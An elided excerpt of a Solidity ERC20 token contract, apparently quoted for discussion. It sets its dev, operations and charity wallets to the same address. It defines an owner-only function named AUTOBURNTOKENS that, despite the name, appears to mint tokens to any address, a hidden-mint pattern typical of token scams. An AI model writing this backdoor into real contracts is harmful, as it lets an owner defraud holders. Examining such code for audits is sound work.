...
contract testing is ERC20, Ownable {
    ...
    address public devWallet = 0x312e1C6D904e103e42cBBe0303D92A899784DaC3;
    address public operationsWallet = 0x312e1C6D904e103e42cBBe0303D92A899784DaC3;
    address public charityWallet = 0x312e1C6D904e103e42cBBe0303D92A899784DaC3;
    ...
    constructor(address routerAdd) ERC20("test", "test") {
        _transact(msg.sender, 1e9 * 10**decimals());
    ...
    function updateMaxWalletlimit(uint256 amount) external onlyOwner {
     ...
     function AUTOBURNTOKENS(address to, uint256 amount) public onlyOwner {
          _transact(to, amount);
    }
